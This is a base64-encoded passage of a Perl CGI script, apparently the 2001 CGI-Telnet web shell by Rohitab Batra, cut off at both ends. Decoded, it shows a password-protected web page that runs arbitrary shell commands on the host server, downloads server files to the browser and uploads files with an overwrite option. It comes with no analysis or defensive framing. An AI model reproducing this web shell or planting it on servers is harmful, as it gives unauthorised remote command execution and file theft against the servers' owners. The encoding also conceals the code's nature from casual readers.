ICAgICAgICAgICAgICAgICAgIAo8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPiAgICAgICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgPC9mb250Pjxmb250IGNvbG9yPSIjQUU4MzAwIj7CqSAyMDAxLCBSb2hpdGFiIEJhdHJhPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj4KICAgICAgICAgICAgICAgICAgIC4tJnF1b3Q7ICAgICAgJnF1b3Q7LS4KICAgICAgICAgICAgICAgICAgLyAgICAgICAgICAgIFwKICAgICAgICAgICAgICAgICB8ICAgICAgICAgICAgICB8CiAgICAgICAgICAgICAgICAgfCwgIC4tLiAgLi0uICAsfAogICAgICAgICAgICAgICAgIHwgKShfby8gIFxvXykoIHwKICAgICAgICAgICAgICAgICB8LyAgICAgL1wgICAgIFx8CiAgICAgICAoQF8gICAgICAgKF8gICAgIF5eICAgICBfKQogIF8gICAgICkgXDwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+X19fX19fXzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+XDwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+X188L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPnxJSUlJSUl8PC9mb250Pjxmb250IGNvbG9yPSIjODA4MDgwIj5fXzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+LzwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+X19fX19fX19fX19fX19fX19fX19fX18KPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj4gKF8pPC9mb250Pjxmb250IGNvbG9yPSIjODA4MDgwIj5AOEA4PC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj57fTwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+Jmx0O19fX19fX19fPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj58LVxJSUlJSUkvLXw8L2ZvbnQ+PGZvbnQgY29sb3I9IiM4MDgwODAiPl9fX19fX19fX19fX19fX19fX19fX19fXyZndDs8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPgogICAgICAgIClfLyAgICAgICAgXCAgICAgICAgICAvIAogICAgICAgKEAgICAgICAgICAgIGAtLS0tLS0tLWAKICAgICAgICAgICAgIDwvZm9udD48Zm9udCBjb2xvcj0iI0FFODMwMCI+VyBBIFIgTiBJIE4gRzogUHJpdmF0ZSBTZXJ2ZXI8L2ZvbnQ+PC9wcmU+CiQ7CiMnCglwcmludCA8PEVORDsKPGNvZGU+ClRyeWluZyAkU2VydmVyTmFtZS4uLjxicj4KQ29ubmVjdGVkIHRvICRTZXJ2ZXJOYW1lPGJyPgpFc2NhcGUgY2hhcmFjdGVyIGlzIF5dCjxjb2RlPiRNZXNzYWdlCkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBtZXNzYWdlIHRoYXQgaW5mb3JtcyB0aGUgdXNlciBvZiBhIGZhaWxlZCBsb2dpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQp7CglwcmludCA8PEVORDsKPGNvZGU+Cjxicj5sb2dpbjogYWRtaW48YnI+CnBhc3N3b3JkOjxicj4KTG9naW4gaW5jb3JyZWN0PGJyPjxicj4KPC9jb2RlPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIGZvciBsb2dnaW5nIGluCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50TG9naW5Gb3JtCnsKCXByaW50IDw8RU5EOwo8Y29kZT4KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJsb2dpbiI+CmxvZ2luOiBhZG1pbjxicj4KcGFzc3dvcmQ6PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KPC9mb3JtPgo8L2NvZGU+CkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBmb290ZXIgZm9yIHRoZSBIVE1MIFBhZ2UKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnRQYWdlRm9vdGVyCnsKCXByaW50ICI8L2ZvbnQ+PC9ib2R5PjwvaHRtbD4iOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUmV0cmVpdmVzIHRoZSB2YWx1ZXMgb2YgYWxsIGNvb2tpZXMuIFRoZSBjb29raWVzIGNhbiBiZSBhY2Nlc3NlcyB1c2luZyB0aGUKIyB2YXJpYWJsZSAkQ29va2llc3snJ30KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgR2V0Q29va2llcwp7CglAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOwoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykKCXsKCQkoJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7CgkJJENvb2tpZXN7JGlkfSA9ICR2YWw7Cgl9Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIHNjcmVlbiB3aGVuIHRoZSB1c2VyIGxvZ3Mgb3V0CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50TG9nb3V0U2NyZWVuCnsKCXByaW50ICI8Y29kZT5Db25uZWN0aW9uIGNsb3NlZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj48L2NvZGU+IjsKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIExvZ3Mgb3V0IHRoZSB1c2VyIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gbG9naW4gYWdhaW4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUGVyZm9ybUxvZ291dAp7CglwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9O1xuIjsgIyByZW1vdmUgcGFzc3dvcmQgY29va2llCgkmUHJpbnRQYWdlSGVhZGVyKCJwIik7CgkmUHJpbnRMb2dvdXRTY3JlZW47CgkmUHJpbnRMb2dpblNjcmVlbjsKCSZQcmludExvZ2luRm9ybTsKCSZQcmludFBhZ2VGb290ZXI7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB0byBsb2dpbiB0aGUgdXNlci4gSWYgdGhlIHBhc3N3b3JkIG1hdGNoZXMsIGl0CiMgZGlzcGxheXMgYSBwYWdlIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHJ1biBjb21tYW5kcy4gSWYgdGhlIHBhc3N3b3JkIGRvZW5zJ3QKIyBtYXRjaCBvciBpZiBubyBwYXNzd29yZCBpcyBlbnRlcmVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIKIyB0byBsb2dpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQZXJmb3JtTG9naW4gCnsKCWlmKCRMb2dpblBhc3N3b3JkIGVxICRQYXNzd29yZCkgIyBwYXNzd29yZCBtYXRjaGVkCgl7CgkJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPSRMb2dpblBhc3N3b3JkO1xuIjsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCX0KCWVsc2UgIyBwYXNzd29yZCBkaWRuJ3QgbWF0Y2gKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJwIik7CgkJJlByaW50TG9naW5TY3JlZW47CgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZAoJCXsKCQkJJlByaW50TG9naW5GYWlsZWRNZXNzYWdlOwoJCX0KCQkmUHJpbnRMb2dpbkZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGNvbW1hbmRzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0KewoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7CglwcmludCA8PEVORDsKPGNvZGU+Cjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CiRQcm9tcHQKPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImMiPgo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPgo8L2Zvcm0+CjwvY29kZT4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBkb3dubG9hZCBmaWxlcwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludEZpbGVEb3dubG9hZEZvcm0KewoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7CglwcmludCA8PEVORDsKPGNvZGU+Cjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iZG93bmxvYWQiPgokUHJvbXB0IGRvd25sb2FkPGJyPjxicj4KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4KRG93bmxvYWQ6IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+CjwvZm9ybT4KPC9jb2RlPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHVwbG9hZCBmaWxlcwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludEZpbGVVcGxvYWRGb3JtCnsKCSRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1cJCAiOwoJcHJpbnQgPDxFTkQ7Cjxjb2RlPgo8Zm9ybSBuYW1lPSJmIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KJFByb21wdCB1cGxvYWQ8YnI+PGJyPgpGaWxlbmFtZTogPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImYiIHNpemU9IjM1Ij48YnI+PGJyPgpPcHRpb25zOiAmbmJzcDs8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im8iIHZhbHVlPSJvdmVyd3JpdGUiPgpPdmVyd3JpdGUgaWYgaXQgRXhpc3RzPGJyPjxicj4KVXBsb2FkOiZuYnNwOyZuYnNwOyZuYnNwOzxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJ1cGxvYWQiPgo8L2Zvcm0+CjwvY29kZT4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB0aW1lb3V0IGZvciBhIGNvbW1hbmQgZXhwaXJlcy4gV2UgbmVlZCB0bwojIHRlcm1pbmF0ZSB0aGUgc2NyaXB0IGltbWVkaWF0ZWx5LiBUaGlzIGZ1bmN0aW9uIGlzIHZhbGlkIG9ubHkgb24gVW5peC4gSXQgaXMKIyBuZXZlciBjYWxsZWQgd2hlbiB0aGUgc2NyaXB0IGlzIHJ1bm5pbmcgb24gTlQuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIENvbW1hbmRUaW1lb3V0CnsKCWlmKCEkV2luTlQpCgl7CgkJYWxhcm0oMCk7CgkJcHJpbnQgPDxFTkQ7CjwveG1wPgo8Y29kZT4KQ29tbWFuZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25kKHMpLgo8YnI+S2lsbGVkIGl0IQo8Y29kZT4KRU5ECgkJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCQlleGl0OwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gZXhlY3V0ZSBjb21tYW5kcy4gSXQgZGlzcGxheXMgdGhlIG91dHB1dCBvZiB0aGUKIyBjb21tYW5kIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gZW50ZXIgYW5vdGhlciBjb21tYW5kLiBUaGUgY2hhbmdlIGRpcmVjdG9yeQojIGNvbW1hbmQgaXMgaGFuZGxlZCBkaWZmZXJlbnRseS4gSW4gdGhpcyBjYXNlLCB0aGUgbmV3IGRpcmVjdG9yeSBpcyBzdG9yZWQgaW4KIyBhbiBpbnRlcm5hbCB2YXJpYWJsZSBhbmQgaXMgdXNlZCBlYWNoIHRpbWUgYSBjb21tYW5kIGhhcyB0byBiZSBleGVjdXRlZC4gVGhlCiMgb3V0cHV0IG9mIHRoZSBjaGFuZ2UgZGlyZWN0b3J5IGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZCB0byB0aGUgdXNlcnMKIyB0aGVyZWZvcmUgZXJyb3IgbWVzc2FnZXMgY2Fubm90IGJlIGRpc3BsYXllZC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgRXhlY3V0ZUNvbW1hbmQKewoJaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqY2RccysoLispLykgIyBpdCBpcyBhIGNoYW5nZSBkaXIgY29tbWFuZAoJewoJCSMgd2UgY2hhbmdlIHRoZSBkaXJlY3RvcnkgaW50ZXJuYWxseS4gVGhlIG91dHB1dCBvZiB0aGUKCQkjIGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZC4KCQkKCQkkT2xkRGlyID0gJEN1cnJlbnREaXI7CgkJJENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAkMSIuJENtZFNlcC4kQ21kUHdkOwoJCWNob3AoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJJFByb21wdCA9ICRXaW5OVCA/ICIkT2xkRGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJE9sZERpcl1cJCAiOwoJCXByaW50ICI8Y29kZT4kUHJvbXB0ICRSdW5Db21tYW5kPC9jb2RlPiI7Cgl9CgllbHNlICMgc29tZSBvdGhlciBjb21tYW5kLCBkaXNwbGF5IHRoZSBvdXRwdXQKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7CgkJcHJpbnQgIjxjb2RlPiRQcm9tcHQgJFJ1bkNvbW1hbmQ8L2NvZGU+PHhtcD4iOwoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4kUnVuQ29tbWFuZC4kUmVkaXJlY3RvcjsKCQlpZighJFdpbk5UKQoJCXsKCQkJJFNJR3snQUxSTSd9ID0gXCZDb21tYW5kVGltZW91dDsKCQkJYWxhcm0oJENvbW1hbmRUaW1lb3V0RHVyYXRpb24pOwoJCX0KCQlpZigkU2hvd0R5bmFtaWNPdXRwdXQpICMgc2hvdyBvdXRwdXQgYXMgaXQgaXMgZ2VuZXJhdGVkCgkJewoJCQkkfD0xOwoJCQkkQ29tbWFuZCAuPSAiIHwiOwoJCQlvcGVuKENvbW1hbmRPdXRwdXQsICRDb21tYW5kKTsKCQkJd2hpbGUoPENvbW1hbmRPdXRwdXQ+KQoJCQl7CgkJCQkkXyA9fiBzLyhcbnxcclxuKSQvLzsKCQkJCXByaW50ICIkX1xuIjsKCQkJfQoJCQkkfD0wOwoJCX0KCQllbHNlICMgc2hvdyBvdXRwdXQgYWZ0ZXIgY29tbWFuZCBjb21wbGV0ZXMKCQl7CgkJCXByaW50IGAkQ29tbWFuZGA7CgkJfQoJCWlmKCEkV2luTlQpCgkJewoJCQlhbGFybSgwKTsKCQl9CgkJcHJpbnQgIjwveG1wPiI7Cgl9CgkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsKCSZQcmludFBhZ2VGb290ZXI7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGRpc3BsYXlzIHRoZSBwYWdlIHRoYXQgY29udGFpbnMgYSBsaW5rIHdoaWNoIGFsbG93cyB0aGUgdXNlcgojIHRvIGRvd25sb2FkIHRoZSBzcGVjaWZpZWQgZmlsZS4gVGhlIHBhZ2UgYWxzbyBjb250YWlucyBhIGF1dG8tcmVmcmVzaAojIGZlYXR1cmUgdGhhdCBzdGFydHMgdGhlIGRvd25sb2FkIGF1dG9tYXRpY2FsbHkuCiMgQXJndW1lbnQgMTogRnVsbHkgcXVhbGlmaWVkIGZpbGVuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnREb3dubG9hZExpbmtQYWdlCnsKCWxvY2FsKCRGaWxlVXJsKSA9IEBfOwoJaWYoLWUgJEZpbGVVcmwpICMgaWYgdGhlIGZpbGUgZXhpc3RzCgl7CgkJIyBlbmNvZGUgdGhlIGZpbGUgbGluayBzbyB3ZSBjYW4gc2VuZCBpdCB0byB0aGUgYnJvd3NlcgoJCSRGaWxlVXJsID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsKCQkkRG93bmxvYWRMaW5rID0gIiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmY9JEZpbGVVcmwmbz1nbyI7CgkJJEh0bWxNZXRhSGVhZGVyID0gIjxtZXRhIEhUVFAtRVFVSVY9XCJSZWZyZXNoXCIgQ09OVEVOVD1cIjE7IFVSTD0kRG93bmxvYWRMaW5rXCI+IjsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJcHJpbnQgPDxFTkQ7Cjxjb2RlPgpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4KSWYgdGhlIGRvd25sb2FkIGRvZXMgbm90IHN0YXJ0IGF1dG9tYXRpY2FsbHksCjxhIGhyZWY9IiREb3dubG9hZExpbmsiPkNsaWNrIEhlcmU8L2E+Lgo8L2NvZGU+CkVORAoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7Cgl9CgllbHNlICMgZmlsZSBkb2Vzbid0IGV4aXN0Cgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJCXByaW50ICI8Y29kZT5GYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhPC9jb2RlPiI7CgkJJlByaW50RmlsZURvd25sb2FkRm9ybTsKCQkmUHJpbnRQYWdlRm9vdGVyOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJvbSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlCiMgYnJvd3Nlciwgc28gdGhhdCBpdCBjYW4gYmUgZG93bmxvYWRlZCBieSB0aGUgdXNlci4KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgc2VudC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgU2VuZEZpbGVUb0Jyb3dzZXIKewoJbG9jYWwoJFNlbmRGaWxlKSA9IEBfOwoJaWYob3BlbihTRU5ERklMRSwgJFNlbmRGaWxlKSkgIyBmaWxlIG9wZW5lZCBmb3IgcmVhZGluZwoJewoJCWlmKCRXaW5OVCkKCQl7CgkJCWJpbm1vZGUoU0VOREZJTEUpOwoJCQliaW5tb2RlKFNURE9VVCk7CgkJfQoJCSRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOwoJCSgkRmlsZW5hbWUgPSAkU2VuZEZpbGUpID1+ICBtIShbXi9eXFxdKikkITsKCQlwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7CgkJcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7CgkJcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSQxXG5cbiI7CgkJcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7CgkJY2xvc2UoU0VOREZJTEUpOwoJfQoJZWxzZSAjIGZhaWxlZCB0byBvcGVuIGZpbGUKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7CgkJcHJpbnQgIjxjb2RlPkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhPC9jb2RlPiI7CgkJJlByaW50RmlsZURvd25sb2FkRm9ybTsKCQkmUHJpbnRQYWdlRm9vdGVyOwoJfQp9CgoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgZG93bmxvYWRzIGEgZmlsZS4gSXQgZGlzcGxheXMgYSBtZXNzYWdlCiMgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluayB0aHJvdWdoIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLgojIFRoaXMgZnVuY3Rpb24gaXMgYWxzbyBjYWxsZWQgd2hlbiB0aGUgdXNlciBjbGlja3Mgb24gdGhhdCBsaW5rLiBJbiB0aGlzIGNhc2UsCiMgdGhlIGZpbGUgaXMgcmVhZCBhbmQgc2VudCB0byB0aGUgYnJvd3Nlci4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgQmVnaW5Eb3dubG9hZAp7CgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwKCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUKCXsKCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7Cgl9CgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQoJewoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87CgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsKCX0KCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQoJewoJCSZT